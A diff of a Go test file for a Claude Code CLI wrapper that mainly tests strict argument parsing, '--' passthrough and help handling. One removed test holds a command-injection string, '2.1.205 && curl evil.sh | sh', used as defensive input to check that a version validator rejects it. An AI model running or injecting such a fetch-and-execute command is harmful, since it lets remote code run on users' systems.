@@ -1,156 +1,115 @@
 package cli
 
-// Internal test: parseGlobals is the subtlest part of the CLI surface and has
-// no exported entry point that does not also touch the filesystem.
+// Internal test: parse is the subtlest part of the CLI surface and has no
+// exported entry point that does not also touch the filesystem.
 
 import (
-	"errors"
 	"testing"
 
 	"github.com/stretchr/testify/require"
 )
 
-func TestParseGlobals(t *testing.T) {
-	t.Run("bare invocation", func(t *testing.T) {
-		g, rest, forced := parseGlobals(nil)
-		require.Empty(t, g.profile)
-		require.Empty(t, rest)
-		require.False(t, forced)
+func TestParse(t *testing.T) {
+	t.Run("bare invocation starts claude with no args", func(t *testing.T) {
+		inv, err := parse(nil)
+		require.NoError(t, err)
+		require.Empty(t, inv.command)
+		require.Empty(t, inv.claudeArgs)
 	})
 
-	t.Run("profile flag, separate value", func(t *testing.T) {
-		g, rest, forced := parseGlobals([]string{"--profile", "work", "--resume"})
-		require.Equal(t, "work", g.profile)
-		require.Equal(t, []string{"--resume"}, rest)
-		require.False(t, forced)
+	t.Run("everything after -- goes to claude verbatim", func(t *testing.T) {
+		inv, err := parse([]string{"--", "--resume", "-p", "explain this"})
+		require.NoError(t, err)
+		require.Empty(t, inv.command)
+		require.Equal(t, []string{"--resume", "-p", "explain this"}, inv.claudeArgs)
 	})
 
-	t.Run("profile flag, equals form", func(t *testing.T) {
-		g, rest, _ := parseGlobals([]string{"--profile=work", "--resume"})
-		require.Equal(t, "work", g.profile)
-		require.Equal(t, []string{"--resume"}, rest)
+	t.Run("ccc flags precede --", func(t *testing.T) {
+		inv, err := parse([]string{"--profile", "work", "--", "--resume"})
+		require.NoError(t, err)
+		require.Equal(t, "work", inv.globals.profile)
+		require.Equal(t, []string{"--resume"}, inv.claudeArgs)
 	})
 
-	t.Run("short profile flag", func(t *testing.T) {
-		g, _, _ := parseGlobals([]string{"-p", "work"})
-		require.Equal(t, "work", g.profile)
+	t.Run("equals forms", func(t *testing.T) {
+		inv, err := parse([]string{"--profile=work", "--runtime=docker"})
+		require.NoError(t, err)
+		require.Equal(t, "work", inv.globals.profile)
+		require.Equal(t, "docker", inv.globals.runtime)
 	})
 
-	t.Run("runtime flag", func(t *testing.T) {
-		g, _, _ := parseGlobals([]string{"--runtime=docker"})
-		require.Equal(t, "docker", g.runtime)
+	// The bug that motivated the strict split: -p is --profile in ccc and
+	// --print in claude, so a permissive parser swallowed `ccc -p "explain this"`
+	// as a profile name.
+	t.Run("-p is ccc's profile, never claude's --print", func(t *testing.T) {
+		inv, err := parse([]string{"-p", "work"})
+		require.NoError(t, err)
+		require.Equal(t, "work", inv.globals.profile)
 
-		g, _, _ = parseGlobals([]string{"--runtime", "podman"})
-		require.Equal(t, "podman", g.runtime)
+		inv, err = parse([]string{"--", "-p", "explain this"})
+		require.NoError(t, err)
+		require.Empty(t, inv.globals.profile)
+		require.Equal(t, []string{"-p", "explain this"}, inv.claudeArgs)
 	})
 
-	t.Run("stops at first non-global", func(t *testing.T) {
-		g, rest, forced := parseGlobals([]string{"doctor"})
-		require.Empty(t, g.profile)
-		require.Equal(t, []string{"doctor"}, rest)
-		require.False(t, forced, "reserved word must still dispatch")
+	t.Run("unknown flag is an error, not a guess", func(t *testing.T) {
+		_, err := parse([]string{"--resume"})
+		require.ErrorContains(t, err, `unknown flag "--resume"`)
+		require.ErrorContains(t, err, "ccc -- --resume", "must show the fix")
 	})
 
-	t.Run("double dash forces passthrough", func(t *testing.T) {
-		_, rest, forced := parseGlobals([]string{"--", "doctor"})
-		require.Equal(t, []string{"doctor"}, rest)
-		require.True(t, forced, "`ccc -- doctor` must reach claude, not ccc")
+	t.Run("unknown command is an error, not a guess", func(t *testing.T) {
+		_, err := parse([]string{"explain this"})
+		require.ErrorContains(t, err, `unknown command "explain this"`)
+		require.ErrorContains(t, err, "ccc -- explain this")
 	})
 
-	t.Run("globals before double dash still parse", func(t *testing.T) {
-		g, rest, forced := parseGlobals([]string{"--profile", "work", "--", "--resume"})
-		require.Equal(t, "work", g.profile)
-		require.Equal(t, []string{"--resume"}, rest)
-		require.True(t, forced)
+	t.Run("commands dispatch with their own args", func(t *testing.T) {
+		inv, err := parse([]string{"pin", "--to", "2.1.205"})
+		require.NoError(t, err)
+		require.Equal(t, "pin", inv.command)
+		require.Equal(t, []string{"--to", "2.1.205"}, inv.cmdArgs)
 	})
 
-	t.Run("claude flags pass through untouched", func(t *testing.T) {
-		_, rest, forced := parseGlobals([]string{"--dangerously-skip-permissions"})
-		require.Equal(t, []string{"--dangerously-skip-permissions"}, rest)
-		require.False(t, forced)
+	t.Run("globals may precede a command", func(t *testing.T) {
+		inv, err := parse([]string{"-p", "work", "pin"})
+		require.NoError(t, err)
+		require.Equal(t, "work", inv.globals.profile)
+		require.Equal(t, "pin", inv.command)
 	})
 
-	t.Run("--help is ccc's help", func(t *testing.T) {
-		g, _, forced := parseGlobals([]string{"--help"})
-		require.True(t, g.help)
-		require.False(t, forced)
+	t.Run("--help anywhere before -- is ccc's help", func(t *testing.T) {
+		for _, args := range [][]string{
+			{"--help"}, {"-h"}, {"--profile", "work", "--help"}, {"pin", "--help"},
+		} {
+			inv, err := parse(args)
+			require.NoError(t, err)
+			require.True(t, inv.globals.help, "%v", args)
+		}
 	})
 
-	t.Run("-h is ccc's help", func(t *testing.T) {
-		g, _, _ := parseGlobals([]string{"-h"})
-		require.True(t, g.help)
+	t.Run("--help after -- is claude's", func(t *testing.T) {
+		inv, err := parse([]string{"--", "--help"})
+		require.NoError(t, err)
+		require.False(t, inv.globals.help)
+		require.Equal(t, []string{"--help"}, inv.claudeArgs)
 	})
 
-	t.Run("double dash reaches claude's help, not ccc's", func(t *testing.T) {
-		g, rest, forced := parseGlobals([]string{"--", "--help"})
-		require.False(t, g.help, "`ccc -- --help` must not print ccc's help")
-		require.Equal(t, []string{"--help"}, rest)
-		require.True(t, forced)
+	t.Run("dangling flag value is an error", func(t *testing.T) {
+		_, err := parse([]string{"--profile"})
+		require.ErrorContains(t, err, "needs a profile name")
+
+		_, err = parse([]string{"--runtime"})
+		require.ErrorContains(t, err, "needs a runtime name")
 	})
 
-	t.Run("help flag after globals", func(t *testing.T) {
-		g, _, _ := parseGlobals([]string{"--profile", "work", "--help"})
-		require.True(t, g.help)
-		require.Equal(t, "work", g.profile)
-	})
-
-	t.Run("dangling flag value does not panic", func(t *testing.T) {
-		g, rest, _ := parseGlobals([]string{"--profile"})
-		require.Empty(t, g.profile)
-		require.Equal(t, []string{"--profile"}, rest)
+	t.Run("only the first -- splits", func(t *testing.T) {
+		inv, err := parse([]string{"--", "--", "x"})
+		require.NoError(t, err)
+		require.Equal(t, []string{"--", "x"}, inv.claudeArgs)
 	})
 }
 
-func TestResolveTarget(t *testing.T) {
-	latest := func(v string) func() (string, error) {
-		return func() (string, error) { return v, nil }
-	}
-	never := func() (string, error) {
-		t.Helper()
-		t.Fatal("must not query the registry")
-		return "", nil
-	}
-
-	t.Run("empty --to resolves latest", func(t *testing.T) {
-		got, err := resolveTarget("", latest("2.1.205"))
-		require.NoError(t, err)
-		require.Equal(t, "2.1.205", got)
-	})
-
-	t.Run("explicit latest resolves to a concrete version", func(t *testing.T) {
-		// Storing "latest" would hash to a stable image tag and freeze the
-		// image forever. It must never be written to a pin.
-		got, err := resolveTarget("latest", latest("2.1.205"))
-		require.NoError(t, err)
-		require.Equal(t, "2.1.205", got)
-		require.NotEqual(t, "latest", got)
-	})
-
-	t.Run("concrete version does not touch the registry", func(t *testing.T) {
-		got, err := resolveTarget("2.1.204", never)
-		require.NoError(t, err)
-		require.Equal(t, "2.1.204", got)
-	})
-
-	t.Run("registry returning latest is an error, not a pin", func(t *testing.T) {
-		_, err := resolveTarget("", latest("latest"))
-		require.ErrorContains(t, err, "not a concrete version")
-	})
-
-	t.Run("registry failure propagates", func(t *testing.T) {
-		_, err := resolveTarget("", func() (string, error) {
-			return "", errors.New("network down")
-		})
-		require.ErrorContains(t, err, "network down")
-	})
-
-	t.Run("hostile --to is rejected before it reaches a build arg", func(t *testing.T) {
-		_, err := resolveTarget("2.1.205 && curl evil.sh | sh", never)
-		require.ErrorContains(t, err, "invalid claude version")
-	})
-}
-
-// `ccc pin --help` printed "unexpected argument --help" before this existed.
 func TestWantsHelp(t *testing.T) {
 	require.True(t, wantsHelp([]string{"--help"}))
 	require.True(t, wantsHelp([]string{"-h"}))
@@ -165,9 +124,9 @@ func TestReservedWordsAreDispatchable(t *testing.T) {
 		require.Contains(t, reserved, name)
 	}
 
-	// Every reserved word is a claude argument that then needs `--` to pass
-	// through, so a collision with a Claude Code subcommand taxes the common
-	// case. This is the list as of 2.1.205; none of it may be reserved.
+	// With a strict split a ccc command can no longer shadow a claude one:
+	// `ccc doctor` is an error naming `ccc -- doctor`. The names still avoid
+	// collision, so that error is never needed for a real claude subcommand.
 	claudeSubcommands := []string{
 		"agents", "auth", "auto-mode", "doctor", "gateway", "install", "mcp",
 		"plugin", "plugins", "project", "setup-token", "ultrareview", "update",
